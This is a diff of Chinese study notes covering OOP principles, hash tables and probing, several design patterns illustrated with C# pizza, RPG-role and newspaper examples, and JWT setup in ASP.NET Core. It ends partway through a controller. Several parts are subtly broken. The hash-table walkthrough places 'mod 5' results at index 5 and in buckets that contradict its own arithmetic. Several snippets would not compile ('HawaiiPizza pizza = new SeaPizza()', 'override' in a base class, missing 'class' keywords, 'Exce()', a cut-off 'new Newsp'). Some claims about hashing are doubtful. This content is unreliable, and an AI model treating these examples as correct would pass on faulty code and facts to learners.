@@ -1,4 +1,71 @@
-# 資料結構
+# 概念
+
+## 物件導向
+
+### 類別(Class) VS 物件(Object)
+
+- ###### 物件(Object)就是類別(Class)的實體，類別(Class)就是物件(Object)的定義
+
+- ###### 類別的定義包含了資料的形式(屬性, Field)以及對資料的操作(方法, Method)
+
+- 
+
+### 三大特性
+
+- ##### 封裝
+
+  - ###### 物件導向有著對物體內部用的定義，以及可以給外部的定義
+
+  - ###### 將物件內部的資料隱藏起來，只能透過物件本身所提供的介面(interface)取得物件內部屬性或者方法，物件內部的細節資料或者邏輯則隱藏起來，其他物件即無法瞭解此物件的內部細節，若不經過允許之窗口(即此物件提供之方法)便無從更動此物件內之資料
+
+  - **對一件事情只需要理解他的外在就好，不需要了解裡面內部的構造**。
+
+    - ###### 例如：我們可以透過getInformation()取得車子資訊，然而我們並不需要知道他是如何取得資訊的。
+
+- ##### 繼承
+
+  - ###### 繼承是一種機制，可以保留某個類別或物件的實作方法。奠基在既有類別上創立一個新的類別，並建立階層的關係。
+
+  - 物件繼承 parent 物件時，可以
+
+    - 獲得了 parent 物件的所有屬性和方法
+    - 用新的方式實現、但同時維持繼承而來的 parent 物件的原有行為
+    - 重複使用或延伸原有的程式碼
+
+- ##### 多型
+
+  - ###### 「多型」代表提供不同類型的實體一個統一的介面，或使用一個單一的符號來表示多個不同的類型。
+
+  - ###### 原有的類別提供一個上層**介面**或**抽象類別**，而目的是為了消除了類別與類別之間的耦合性，使程式更容易維護與擴充**。**
+
+- ##### 多載(Overloading) 
+
+  -  是指說在**相同類別**中，定義**名稱相同**，但是**參數個數不同**，或是**參數型態不同**的函式，這樣就可以利用參數個數或者參數型態，呼叫到對應的方法
+
+### 介面 VS 抽象類別
+
+- ###### 介面可以被理解為「**接口」**，讓外部可以透過這個接口與內部作溝通。**規範了方法能被外部使用的規則**
+
+  - 定義不同種類的物件中，所擁有的相同屬性功能(ex. 飛機、鳥都會飛但是飛的方式不同)
+
+  - 透過介面可以定義功能接口(涵式)及規範(參數)，讓所有繼承的物件都必須遵守規範實作該功能
+
+    - Ex.戰士、法師、補師都有"攻擊、防守"的功能，但彼此的實作方式都不同。
+    - 透過介面定義功能、防守等涵式(街口)，定義所有繼承的腳色都必須實做這些功能
+
+  - ###### 介面是對行為的抽象
+
+- ##### 抽像類別是**不能直接實例化**的類別。
+
+  - ###### 用來定義相同種類的物件，所需要具備的共通特性；例如動物(Animal)，是所有動物的基底，所有動物具有吃、喝、睡覺等等共同的特性
+
+  - ###### **一個抽象類可以提供沒有實現，或不完整的實現。**
+
+  - ###### 抽像類型的每個實例都是某個具體子類型的實例
+
+  - ###### 抽象類別是對類別的抽象
+
+
 
 ## Process 
 
@@ -208,6 +275,160 @@
 
 
 ## Hash
+
+- ###### 電腦科學中一種對資料的處理方法，通過某種特定的函式/演算法（稱為雜湊函式/演算法）將要檢索的項與用來檢索的索引（稱為雜湊，或者雜湊值）關聯起來，生成一種便於搜尋的資料結構
+
+- ###### 雜湊演算法也被用來加密存在資料庫中的密碼（password）字串，由於雜湊演算法所計算出來的雜湊值（Hash Value）具有不可逆（無法逆向演算回原本的數值）的性質，因此可有效的保護密碼。
+
+- ###### 一種資料儲存與擷取之技術，當要存取 Data X 之前，必須先經過 Hashing Function 計算求出 Hashing Address，再到 Hash Table 中對應的 Bucket 中存取 Data X，而 Hash Table 結構是由 B 個 buckets 組成，每個 bucket 有 S 個 Slots，每個 Slot 可存一筆 Data
+
+- ##### Hashing 優點
+
+  1. ###### 搜尋 Data 之前，無需事先排序過
+
+  2. ###### 再沒有 Collision 情況下，Search X 之 time 為: O (1)，與資料量 n 無關
+
+  3. ###### 保密 / 安全性高，在不知道 Hashing Function 下，很難取得 Data
+
+  4. ###### 可作為 Data 壓縮之用途
+
+     - ###### 例如：Unix 之 password 採用一對一，不可逆之 Hashing
+
+- ##### Collision
+
+  - ###### 不同的 Data，例如 (x,y)，經過 Hashing function 計算後得出相同的 Hashing Address 稱之，也就是 H (x) = H (y)
+
+- #####  Overflow 
+
+  - ###### Collision 發生後，且對應的 Bucket 已滿，則稱為 Overflow
+
+  - ##### 處理方法
+
+    - ##### Linear Probing (線性探測)
+
+      - ###### 當兩筆資 x 與 y，代入雜湊函式 H(x) 與 H(y) 之後，若得到相同的雜湊值，則會發生溢位，此時可以將雜湊值依序 + 1，一格一格往後尋找有沒有其它空位，直到找到空位，或是儲存空間皆存滿為止
+
+      - ![https://ithelp.ithome.com.tw/upload/images/20200930/20129841owOclTmA1g.png](https://ithelp.ithome.com.tw/upload/images/20200930/20129841owOclTmA1g.png)
+
+      - 優點：
+
+        1. 簡單、易於實施
+        2. 保證 Table 空間可以充分利用
+
+      - ##### 缺點：
+
+        ##### 容易發生 Primary Clustering 現象，造成 Search/Insert/Delete X 等時間大幅增加之問題
+
+        ##### Primary Clustering ：具有相同 Hashing Address 之 Data 容易占用相鄰的 Buckets 存放，形成群聚現象
+
+    - #####  Quadratic Probing (二次方探測)
+
+      - ###### 當 H (x) 發生 overflow 時，則探測![https://chart.googleapis.com/chart?cht=tx&chl=(%20H(x)%20%5Cpm%20i%5E2%20)%20%25%20b](https://chart.googleapis.com/chart?cht=tx&chl=(%20H(x)%20%5Cpm%20i%5E2%20)%20%25%20b) 
+
+      - ###### B 為 Bucket 數目，i 是逐一遞增 i = 1,2,3,4,....，套入公式後，即可找到新的儲存位置，若還是發生溢位，則 i 繼續加 1 ，並代入公式
+
+      - ![https://ithelp.ithome.com.tw/upload/images/20200930/20129841w9Oce294uH.png](https://ithelp.ithome.com.tw/upload/images/20200930/20129841w9Oce294uH.png)
+
+    - **再雜湊 (Rehashing)**
+
+      - ###### 準備多個雜湊函式，當第一種雜湊函式遇到溢位時，就換第二種雜湊函式，如果第二種雜湊函式遇到溢位時，就算第三種，直到沒有發生溢位為止
+
+    - ##### Chaining or Link List (鏈結串列)
+
+      - ###### 具有相同的 Hashing Address 的 Data 均置入同一個 Bucket 去，而 Bucket 內之 Data 彼此透過 Link List 結構串連在一起，而這種情況就作 Closed Address Mode
+
+      - ![https://ithelp.ithome.com.tw/upload/images/20200930/20129841JnoYoG0rLp.png](https://ithelp.ithome.com.tw/upload/images/20200930/20129841JnoYoG0rLp.png)
+
+### **雜湊函數 (Hash function)**
+
+- ##### 將不定長度訊息的輸入，演算成固定長度雜湊值的輸出，且所計算出來的雜湊值必須符合兩個主要條件：
+
+  - ###### 由雜湊值是無法反推出原來的訊息
+
+  - ###### 雜湊值必須隨明文改變而改變。
+
+- ##### 好的 Hashing Function 設計，要滿足下列三個 criteria：
+
+  - ###### 計算宜簡單，不要過度複雜
+
+  - ###### Collision 要少
+
+  - ###### 不要造成 Hash Table 局部儲存之情況，要夠均勻才好
+
+- ##### 常見的 Hashing Function 設計
+
+  - ##### Middle Square
+
+    - ###### 將鍵值平方後，取中間適當位數作為 Hashing Address 
+
+      - 例如：鍵值 = 8125，平方後， = 66015625 取中間三個位數，156 作為 Hashing Address
+
+  - ##### Mod (or Divide) 取餘數
+
+    - ###### H(X) = X % M
+
+  - ##### Folding Addition
+
+    - ##### 將鍵值切成幾個相同長度之片段 (P1~Pn)，再將這些片段加總，即得 Hash Address。而相加的方法有兩種：
+
+      - ###### shift (位移)
+
+      - ###### bounding (邊界)
+
+    - ![https://ithelp.ithome.com.tw/upload/images/20200930/20129841QkZJaaipBw.png](https://ithelp.ithome.com.tw/upload/images/20200930/20129841QkZJaaipBw.png)
+
+    - ```C#
+      例如：x = 12320324111220
+      
+      切成這樣：
+      P1 = 123
+      P2 = 203
+      P3 = 241
+      P4 = 112
+      P5 = 020
+          
+      shift 作法
+      將 P1~Pn 相加 = 699
+      
+      bounding 作法
+      偶數的片段反向，所以：
+      P2 = 302
+      P4 = 211
+      再加總 P1~Pn = 897
+      ```
+
+  - ##### **數位分析法 (Digits Analysis)**
+
+    - ###### 如果已知資料的相似度很高，則可將重覆的資料捨去，例如手機號碼，都是 09 開頭，則 09 的部分就不需要參與計算，可挑選某一段具特殊意義的數字來做運算
+
+### **雜湊表 (Hash table)**
+
+- ###### 用雜湊函數運算出來的雜湊值，根據 **鍵 (key)** 來儲存在數據結構中
+
+- ex
+
+  - ```C#
+    //舉例來說，我們有一筆資料用字典的形式表示，每個名字都搭配性別：
+    {Joe:'M', Sue:'F', Dan:'M', Nell:'F', Ally:'F', Bob:'M'}
+    
+    //將每個名字經過雜湊函數的運算。
+    (Key)                 (hash value)     (stored index)
+    Joe  → (Hash function) →   4928   mod 5   =   3
+    Sue  → (Hash function) →   7291   mod 5   =   1
+    Dan  → (Hash function) →   1539   mod 5   =   4
+    Nell → (Hash function) →   6276   mod 5   =   1
+    Ally → (Hash function) →   9143   mod 5   =   3
+    Bob  → (Hash function) →   5278   mod 5   =   3
+    hash value 是獨一無二的，用 mod 5 來得到餘數並儲存才記憶體中。
+    0： 
+    1： [ Sue, F ] → [ Nell, F ]
+    2： 
+    3： 
+    4： [ Joe, M ] → [ Ally, F ] → [ Bob, M ]
+    5： [ Dan, M ]
+    ```
+
+- 
 
 
 
@@ -515,7 +736,8 @@
 
   - ###### 憑證簽發有關單位的電子簽名
 
-    
+
+
 
 # 設計模式
 
@@ -575,9 +797,690 @@
 
   - ###### 抽象不應該依賴細節；細節應該依賴抽象。
 
+  - 
+
+## 簡單工廠模式(Simple Factory Pattern)
+
+### 定義
+
+- 透過建立一個類別來負責創建實體，這些實體都繼承於同一個父類別
+- Product: 抽象的父類別(披薩)
+- Factory: 負責建立實體邏輯的類別
+- ConcreteProduct: 實體本身(海鮮、夏威夷)
+
+### 實例
+
+- 假設我們是一間我們是一間披薩店提供各種口味的披薩。
+
+- 披薩製作的程序包含AddMaterial(加料)、Bake(烘烤)，當客人要一個海鮮披薩時如下
+
+  ```cs
+  public SeaPizza MakePizza()
+  {
+      SeaPizza pizza= new SeaPizza();
+      pizza.AddMaterial(); 
+      pizza.Bake(); 
+      return pizza;
+  }
+  ```
+
+   
+
+- 當今天可人要改點夏威夷披薩時
+
+  ```cs
+  public HawaiiPizza MakePizza()
+  {
+      HawaiiPizza pizza= new SeaPizza();
+      pizza.AddMaterial(); 
+      pizza.Bake(); 
+      return pizza;
+  }
+  ```
+
+   
+
+- 我們可以發現，當今天我們研發出新的口味時我們就必須建立新的類別。可是每個類別執行的動作其實都是一樣的(AddMaterial、Bake)，這時候我們可以將這些行為封裝起來成為一個抽象的Product
+
+  ```cs
+  public interface IPizza
+  {
+      void AddMaterial();
+      void Bake();
+  }
+  ```
+
+   
+
+- 接著，我們可以讓每種口味的披薩繼承IPizza介面並根據每個披薩的種類時做內容
+
+  ```cs
+  public class SeaPizza: IPizza
+  {
+    public void AddMaterial()
+    {
+     Console.WriteLine("加入海鮮佐料");
+    }
+  
+    public void Bake()
+    {
+     Console.WriteLine("烘烤海鮮披薩");
+    }
+  }
+  
+  public class HawaiiPizza : IPizza
+  {
+    public void AddMaterial()
+    {
+     Console.WriteLine("加入火腿片、鳳梨");
+    }
+  
+    public void Bake()
+    {
+     Console.WriteLine("烘烤夏威夷披薩");
+    }
+  }
+  ```
+
+   
+
+- 最後我們建立一個SimpleFactory來決定何時該生產哪種口味的披薩。
+
+  ```cs
+  public class SimpleFactory
+  {
+      public IPizza CreatePizza(string name)
+      {
+          if (name== "Sea")
+              return new SeaPizza();
+  
+          if (name== "Hawaii")
+              return new HawaiiPizza();
+  
+          else
+              return null;
+      }
+  }
+  ```
+
+   
+
+- 另外，我們可以將整個披薩的製成包裝在一個類別裡
+
+  ```cs
+  public class PizzaStore
+  {
+      private SimpleFactory  _factory;
+  
+      public PizzaStore(SimpleFactory  pFactory)
+      {
+          _factory = pFactory;
+      }
+  
+      public IPizza CreateProduct(string name)
+      {
+          IPizza pizza = _factory.CreatePizza(name);
+  
+          pizza .AddMaterial();
+          pizza .Bake();
+  
+          return pizza ;
+      }
+  }
+  ```
+
+   
+
+- 終於，我們可以依造客人的需求提供不同的Pizza了
+
+  ```cs
+  static void Main(string[] args)
+  {
+      PizzaStore store = new PizzaStore(new SimpleFactory());
+  
+      store.CreateProduct("Sea");
+  
+      store.CreateProduct("Hawaii");
+  }
+  ```
+
+## 工廠方法模式(Factory Method Pattern)
+
+- ##### 簡單工廠的延伸，不再提供統一的工廠類來建立所有物件，而是將Factory類別抽象化，針對**不同分類的物件有不同的工廠**。
+
+- **優點：** 
+
+  - ###### 將創建物件的邏輯與物件本身的邏輯分離。一個工廠只會對應一個類別，完全遵守了[開放封閉原則](https://ithelp.ithome.com.tw/articles/10233481)。
+
+### 結構
+
+- 抽象工廠角色(IFactory)：定義抽象的方法或介面，讓繼承的實體工廠進行實作
+- 具體工廠角色：實作抽象工廠
+- 抽象產品角色(IPizza)：定義產品抽象方法或介面
+- 具體產品角色：實作抽象產品的方法或介面
+
+### 建立抽象工廠
+
+- 從上次簡單工廠的例子中我們可以看出，當我們需要增加新的口味時，工廠類別的判斷式就會不段增加。
+
+  ```cs
+  public class SimpleFactory
+  {
+      public IPizza CreatePizza(string name)
+      {
+          if (name== "Sea")
+              return new SeaPizza();
+  
+          if (name== "Hawaii")
+              return new HawaiiPizza();
+  
+          if (name== "Pork")
+              return new PorkPizza();
+  
+          if ...
+  
+          else
+              return null;
+      }
+  }
+  ```
+
+- 這樣的結果造成了工廠類別的複雜度，也導致我們的維護成本提升
+
+- 因此，我們在一次抽象畫工廠類別
+
+  ```cs
+  public interface IFactory
+  {
+    Ipizza  CreatePizza();
+  }
+  ```
+
+- 接著，我們只須要讓每種口味的披薩自己去時做各自工廠的邏輯
+
+  ```cs
+  class PorkPizzaFactory : IFactory
+  {
+      public Ipizza CreatePizza()
+      {
+          return new PorkPizza();        
+      }
+  }
+  
+  class SeaPizzaFactory : IFactory
+  {
+      public Ipizza CreatePizza()
+      {
+          return new SeaPizza(); 
+      }
+  }
+  ```
+
+- 當我們需要新的口味時，只要建立一個新的具體工廠腳色。這樣一來我們在維護上也變得更加輕鬆，程式的相依性也相對降低。
+
+- 最後，我們在來改寫上次的PizzaStore
+
+  ```cs
+  public class PizzaStore
+  {
+      private IFactory _factory;
+  
+      public PizzaStore(IFactory pFactory)
+      {
+          _factory = pFactory;
+      }
+  
+      public IPizza CreateOrder()
+      {
+          IPizza pizza = _factory.CreatePizza();
+  
+          pizza .AddMaterial();
+          pizza .Bake();
+  
+          return pizza ;
+      }
+  }
+  ```
+
+  ```cs
+  static void Main(string[] args)
+  {
+      PizzaStore seaStore = new PizzaStore(new seaPizzaFactory ());
+      seaStore.CreateOrder();
+  
+      PizzaStore porkStore = new PizzaStore(new PorkPizzaFactory ());
+      porkStore.CreateOrder();
+  }
+  ```
 
 
-# Application
+
+## 策略模式(Strategy Pattern)
+
+- #### 定義`一系列的演算法`，並且把這些算法，`用介面封裝到有公共介面的策略類中`，使他們可以互相替換。
+
+- ##### 策略模式主要是在封裝執行相同行為的類別，這些類別是針對相同的任務但本身的邏輯/內容可能不相同。
+
+- ##### 將這些行為封裝起來便於抽換，以保持彼此間的獨立。
+
+### 情境:
+
+- ##### 假設我們今天要開發一款RPG遊戲，裡面包含戰士、盜賊、弓箭手。
+
+- ##### 每個角色都包含攻擊及防禦兩個行為，這時候建立一個腳色的類別好像是不錯的主意。這樣每個腳色都能繼承類別中的行為。
+
+  ```cs
+  public abstract class Role
+  {
+      public override void Attack()
+      {
+          Console.WriteLine("進行攻擊");
+      }
+  
+      public void Defence()
+      {
+          Console.WriteLine("進行防禦");
+      }
+  }
+  
+  public class Warrior: Role
+  {
+  }
+  
+  public class Assassin : Role
+  {
+  }
+  ```
+
+- ##### 今天我們新開了一個法師的腳色，而且法師的攻擊與戰士的攻擊甚至是盜賊、弓箭手之間的模式應該都是不一樣的，這時候，你可能會想用繼承類別行為的發法來改寫每一個腳色的動作
+
+  ```cs
+  public abstract class Role
+  {
+      public void Attack()
+      {
+      }
+  
+      public void Defence()
+      {
+      }
+  
+      public void Support()
+      {
+      }
+  }
+  
+  public class Warrior: Role
+  {
+  
+      public override void Attack()
+      {
+          Console.WriteLine("進行強力攻擊");
+      }
+  
+      public void Defence()
+      {
+          Console.WriteLine("進行盾牌防禦");
+      }
+  }
+  
+  public class Assassin : Role
+  {
+  
+      public void Attack()
+      {
+          Console.WriteLine("進行背刺");
+      }
+  
+      public void Defence()
+      {
+          Console.WriteLine("進行潛行");
+      }
+  }
+  
+  public class Magician : Role
+  {
+  
+      public void Attack()
+      {
+          Console.WriteLine("魔法攻擊");
+      }
+  
+      public void Defence()
+      {
+          Console.WriteLine("展開分身");
+      }
+  }
+  ```
+
+- ##### 這當然是一種方法，可是當我們又增加 一個行為時又必須調整每一個腳色。
+
+### 定義
+
+- 將變動部分封裝起來
+- 針對介面寫程式，不是針對實踐寫程式。
+- 多用合成，少用繼承。
+
+### 調整
+
+- 將攻擊、防禦等行為封裝成介面
+
+  ```cs
+  public interface AttackBehavior{
+      public void Exec();
+  }
+  
+  public interface DefenseBehavior{
+      public void Exec();
+  }
+  ```
+
+- 每一種動作繼承改寫對應的行為
+
+  ```cs
+  public WeaponAttack : AttackBehavior
+  {
+   public void Exec()
+   {
+    Console.WriteLine("使用弓箭射擊");
+   }
+  }
+  
+  public NormalAttack : AttackBehavior
+  {
+   public void Exec()
+   {
+    Console.WriteLine("使用重拳攻擊");
+   }
+  }
+  
+  public MagicAttack : AttackBehavior
+  {
+   public void Exec()
+   {
+    Console.WriteLine("使用魔法攻擊");
+   }
+  }
+  ```
+
+- 最後，我們來調整腳色的類別
+
+  ```cs
+  public class Role
+  {
+      private AttackBehavior _attackBehavior;
+      private DefenseBehavior _defenseBehavior ;
+      
+      public Role(AttackBehavior attackMode, DefenseBehavior defenseMode)
+      {
+       this._attackBehavior = attackMode;
+       this._defenseBehavior = defenseMode;
+      }
+  
+      public override void Attack()
+      {
+       this._attackBehavior.Exce();
+      }
+  
+      public void Defense()
+      {
+       this._defenseBehavior .Exce();
+      }
+  }
+  
+  static void Main(string[] args)
+  {
+      Role Worrior = new Role(new NormalAttack(),new NormalDefense());
+      Worrior.Attack();
+      Worrior.Defense();
+  
+      Role Magican = new Role(new MagicAttack(),new MagicDefense());
+      Magican.Attack();
+      Magican.Defense();
+  }
+  ```
+
+##  觀察者模式 (Observer Pattern)
+
+- ###### 定義物件之間一種一對多的依賴關係，當一個物件狀態發生改變時，所有依賴於他的物件都將自動地得到通知且被更新。
+
+### 前言
+
+- 生活中，我們透過不同的『訂閱』機制，來取得最新資訊。例如，訂閱報紙、部落格、FB粉絲追蹤
+- 這種訂閱後就能自動收到更新通知 的概念，即是 觀察者模式。
+- 被訂閱、被追蹤、被觀察的，稱為 — 主題/目標 (Subject)
+- 而對主題感興趣的則是 — 觀察者 (Observer) ，
+
+### 以訂閱報紙為例
+
+- 首先，我們要定義目標(Subject)類別，要求繼承類別的物件必須實作註冊、移除、發送通知等方法。
+
+- 接著，我們定義一個Observer類別，要求每個繼承類別的物件必須實作update()方法
+
+- ```cs
+  public interface ISubject
+  {
+      void RegisterObserver(IObserver observer);
+      void RemoveObserver(IObserver observer);
+      void NotifyObservers(string msg);
+  }
+  
+  public interface IObserver
+  {
+      void Update(string msg);
+  }
+  ```
+
+   
+
+- 接下來，我們開始實作報社類別並實作註冊、移除、發送通知等方法。
+
+  ```cs
+  public class NewspaperOffice : ISubject
+  {
+      List observerList; // 使用List來存放觀察者名單
+  
+      public NewspaperOffice()
+      {
+          observerList= new List();
+      }
+  
+      // 加入觀察者
+      public void RegisterObserver(IObserver observer)
+      {
+          observerList.Add(observer);
+      }
+  
+      // 移除觀察者
+      public void RemoveObserver(IObserver observer)
+      {
+          if (observerList.IndexOf(observer) >= 0)
+              observerList.Remove(observer);
+      }
+  
+      // 發送通知給在監聽名單中的觀察者
+      public void NotifyObservers(string message)
+      {
+          foreach (IObserver observer in observerList)
+          {
+              observer.Update(message);
+          }
+      }
+  
+      // 訂閱報紙
+      public void SubscribeNewspaper(IObserver customer)
+      {
+          RegisterObserver(customer);
+      }
+  
+      // 取消訂閱報紙
+      public void UnsubscribeNewspaper(IObserver customer)
+      {
+          RemoveObserver(customer);
+      }
+  
+      // 發送新消息
+      public void SendNewspaper(string message)
+      {
+          Console.WriteLine("Send News..");
+          NotifyObservers(message);
+      }
+  }
+  ```
+
+   
+
+- 實作Observer類別
+
+  ```cs
+  public class Customer : IObserver
+  {
+      public string Name { private get; set; }
+  
+      public Customer(string pName)
+      {
+          Name= pName;
+      }
+      
+      // 更新最新消息
+      public void Update(string message)
+      {
+          Console.WriteLine("   {0} receive a new message:{1}", Name , message);
+      }
+  }
+  
+  static void Main(string[] args)
+  {
+      // 產生一間報社
+      NewspaperOffice office = new Newsp
+  
+      Customer AA = new Customer("AA");
+      Customer BB = new Customer("BB");
+  
+      office.SubscribeNewspaper(AA);
+      office.SubscribeNewspaper(BB);
+  
+      // 報社發送了第一則新聞
+      office.SendNewspaper("News One.......");
+  
+      office.UnsubscribeNewspaper(AA);
+  
+      office.SendNewspaper("News Two.......");
+  }
+  ```
+
+## 樣板方法模式(Template Method Pattern)
+
+- ##### 把重複性的部分封裝至父類別，讓各類別不同的方法由子類別繼承實踐
+
+### 定義
+
+- ##### 將一個演算法的骨架定義在一個方法中，而演算法本身會用到的一些方法，則是定義在次類別中
+
+- ##### 樣板方法讓次類別在不改變演算法架構的情況下，重新定義演算法中的某些步驟
+
+- ##### 樣板方法定義了一個演算法的步驟，並允許次類別為一個或多個步驟，提供其實踐方式
+
+- ##### 樣板就是一個方法；更具體地說，這個方法將演算法定義成一組步驟。其中的任何步驟都可以是抽象方法，而由次類別負責實踐這些抽象方法。這可以確保演算法的結構維持不變，同時由次類別提供部份實踐方式
+
+- ##### 策略模式與樣版方法模式都是用來封裝演算法。策略模式是用合成；樣板方法模式是用繼承
+
+### 實作
+
+- 定義父類別及封裝共用方法
+
+  ```cs
+  abstract class DataAccessObject
+  
+    {
+      protected string connectionString;
+      protected DataSet dataSet;
+   
+      public virtual void Connect()
+      {
+        connectionString =
+          "provider=Microsoft.JET.OLEDB.4.0; " +
+          "data source=..\\..\\..\\db1.mdb";
+      }
+   
+      public virtual void Disconnect()
+      {
+        connectionString = "";
+      }
+   
+   
+      public abstract void Select();
+      public abstract void Process();
+  
+      public void Run()
+      {
+        Connect();
+        Select();
+        Process();
+        Disconnect();
+      }
+    }
+  ```
+
+   
+
+- 子類別繼承父類別，並改寫各自的內容
+
+  ```cs
+    class Categories : DataAccessObject
+    {
+      public override void Select()
+      {
+        string sql = "select CategoryName from Categories";
+        OleDbDataAdapter dataAdapter = new OleDbDataAdapter(
+          sql, connectionString);
+   
+        dataSet = new DataSet();
+        dataAdapter.Fill(dataSet, "Categories");
+      }
+   
+      public override void Process()
+      {
+        Console.WriteLine("Categories ---- ");
+   
+        DataTable dataTable = dataSet.Tables["Categories"];
+        foreach (DataRow row in dataTable.Rows)
+        {
+          Console.WriteLine(row["CategoryName"]);
+        }
+        Console.WriteLine();
+      }
+    }
+   
+  
+    class Products : DataAccessObject
+    {
+      public override void Select()
+      {
+        string sql = "select ProductName from Products";
+        OleDbDataAdapter dataAdapter = new OleDbDataAdapter(
+          sql, connectionString);
+   
+        dataSet = new DataSet();
+        dataAdapter.Fill(dataSet, "Products");
+      }
+   
+      public override void Process()
+      {
+        Console.WriteLine("Products ---- ");
+        DataTable dataTable = dataSet.Tables["Products"];
+        foreach (DataRow row in dataTable.Rows)
+        {
+          Console.WriteLine(row["ProductName"]);
+        }
+        Console.WriteLine();
+      }
+    }
+  ```
+
+   
+
+# 應用
 
 ## Message Queue
 
@@ -1382,4 +2285,327 @@ public class HomeController : Controller
       var description = ((ReportDescriptionAttribute)attributes[0]).Description;
       ```
 
-      
+
+## Json Web Token
+
+- ##### JWT是一種『有限時間內可利用認證令牌要求對應的操作權限』的一種方法
+
+- ##### 使用者登入後產生Token，後續針對Request內夾帶的Token進行驗證。
+
+  - ##### 客戶端從伺服器端取得認證簽名後，伺服器端只對認證簽名進行驗證，從認證簽名來判斷是不是具備指定的操作資格．除此之外還會判斷令牌是否過期、是否是黑名單等狀況。
+
+- ##### 主要驗證內容為產生Token時的資訊內容。Ex.
+
+  - ###### 相同的 **Issuer **設定值
+
+  - ###### 相同的 **Audience **設定值
+
+  - ###### 驗證 **Token **有效期限
+
+    - ###### 符合對稱式加密的簽章
+
+  - ###### Token內可包含自定義資訊，但驗證時不會針對使用者進行驗證，因為驗證時不會再連接DB。
+
+  - ###### 因此，只要產生Token的設定一致，不同Service也可以透過相同Token驗證
+
+- ##### 包含了 **header**、**payload**和**signature** 三個部分
+
+  - **Header** 
+
+    - ##### 包含了兩個主要資訊：使用的加密演算法和token的類型(基本上就是JWT)
+
+    - ##### 這些內容通過 [Base64](https://zh.wikipedia.org/wiki/Base64) 轉化就能夠得到我們的第一段字串。
+
+      - ```
+        eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+        ```
+
+    ```C#
+    // 使用HS256演算法來產生JWT token
+    {
+      "alg": "HS256",
+      "typ": "JWT"
+    }
+    ```
+
+  - **Payload**
+
+    - ##### 包含了聲明的資料，帶有欲存放的資訊（例如用戶資訊）
+
+    - ##### Payload 又可以被稱為 claims
+
+    - ##### 定義上有 3 種聲明 (Claims)
+
+      - ###### Reserved (註冊聲明)
+
+      - ###### Public (公開聲明)
+
+      - ###### Private (私有聲明)
+
+    - ##### Reserved (註冊聲明)
+
+      - ###### iss (Issuer) - JWT的發行人
+
+      - ###### sub (Subject) - JWT的主題（用戶）
+
+      - ###### aud（audience）：JWT的目標收件人
+
+      - ###### exp（expiration time）：JWT到期的時間
+
+      - ###### nbf（not before time）：不得接受JWT處理的時間
+
+      - ###### iat（issued at time）：發布JWT的時間; 可用於確定JWT的年齡
+
+      - ###### jti（JWT ID）：唯一標識符; 可用於防止JWT被重放（允許令牌僅使用一次）
+
+    - base64 加密（該加密是可以對稱解密的)
+
+    ```C#
+    /*
+        sub就是RFC7519中定義的基本資訊，
+        age則是我們自己加上去的
+    */
+    
+    {
+      "sub": "wellwind",
+      "age": 30
+    }
+    ```
+
+  - **Signature**
+
+    - ###### 將被轉換成 Base64 編碼的 Header、Payload 與自己定義的密鑰，透過在 Header 設定的雜湊演算法方式所產生的
+
+    - ###### 用來確保資料完整性的一個雜湊簽章
+
+    - ###### 可以選用任何雜湊演算法來進行處理
+
+- 驗證流程
+
+  ![img](https://dotblogsfile.blob.core.windows.net/user/wellwind/c93407af-3191-48e8-9029-2e02a7e03b1e/1479955047_94613.png)
+
+- 流程
+
+  1. 使用者登入進行身分驗證後產生Token
+
+     ```C#
+     [Route("api/[controller]")]
+     [ApiController]
+     public class AuthController : ControllerBase
+     {
+         private readonly IConfiguration _config;
+     
+         public AuthController(IConfiguration configuration)
+         {
+             _config = configuration;
+         }
+     
+         // GET api/auth/login
+         [HttpGet, Route("login")]
+         public IActionResult Login(string name)
+         {
+             // STEP0: 在產生 JWT Token 之前，可以依需求做身分驗證
+     
+             // STEP1: 建立使用者的 Claims 聲明，這會是 JWT Payload 的一部分
+             var userClaims = new ClaimsIdentity(new[] {
+                 new Claim(JwtRegisteredClaimNames.NameId, name),
+                 new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
+                 new Claim("CustomClaim", "Anything You Like")
+             });
+             // STEP2: 取得對稱式加密 JWT Signature 的金鑰
+             // 這部分是選用，但此範例在 Startup.cs 中有設定 ValidateIssuerSigningKey = true 所以這裡必填
+             var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_config["Jwt:Key"]));
+             // STEP3: 建立 JWT TokenHandler 以及用於描述 JWT 的 TokenDescriptor
+             var tokenHandler = new JwtSecurityTokenHandler();
+             var tokenDescriptor = new SecurityTokenDescriptor
+             {
+                 Issuer = _config["Jwt:Issuer"],
+                 Audience = _config["Jwt:Issuer"],
+                 Subject = userClaims,
+                 Expires = DateTime.Now.AddMinutes(30),
+                 SigningCredentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256)
+             };
+             // 產出所需要的 JWT Token 物件
+             var securityToken = tokenHandler.CreateToken(tokenDescriptor);
+             // 產出序列化的 JWT Token 字串
+             var serializeToken = tokenHandler.WriteToken(securityToken);
+     
+             return new ContentResult() { Content = serializeToken };
+         }
+     }
+     ```
+
+  2. 專案內加入驗證
+
+     ```C#
+     public void ConfigureServices(IServiceCollection services)
+     {
+         services.AddMvc().SetCompatibilityVersion(CompatibilityVersion.Version_2_2);
+     
+         // STEP1: 設定用哪種方式驗證 HTTP Request 是否合法
+         services
+         // 檢查 HTTP Header 的 Authorization 是否有 JWT Bearer Token
+         .AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
+         // 設定 JWT Bearer Token 的檢查選項
+         .AddJwtBearer(options =>
+          {
+            options.TokenValidationParameters = new TokenValidationParameters
+            {
+                ValidateIssuer = true,
+                ValidIssuer = Configuration["Jwt:Issuer"],
+                ValidateAudience = true,
+                ValidAudience = Configuration["Jwt:Issuer"],
+                ValidateLifetime = true,
+                ValidateIssuerSigningKey = true,
+                IssuerSigningKey = new SymmetricSecurityKey
+                    (Encoding.UTF8.GetBytes(Configuration["Jwt:Key"]))
+            };
+          });
+     }
+     ```
+
+  3. 驗證API
+
+     ```C#
+     [Route("api/[controller]")]
+     [ApiController]
+     public class ValuesController : ControllerBase
+     {
+         // GET api/values/anonymous
+         /// <summary>使用匿名登入，無視於身分驗證</summary>
+         [AllowAnonymous]
+         [HttpGet, Route("anonymous")]
+         public IActionResult Anonymous()
+         {
+             return new ContentResult() { Content = $@"For all anonymous." };
+         }
+     
+         // GET api/values/authorize
+         /// <summary>使用身分驗證，HTTP 的 Authorization Header 必須設定合法的 JWT Bearer Token 才能使用</summary>
+         [Authorize]
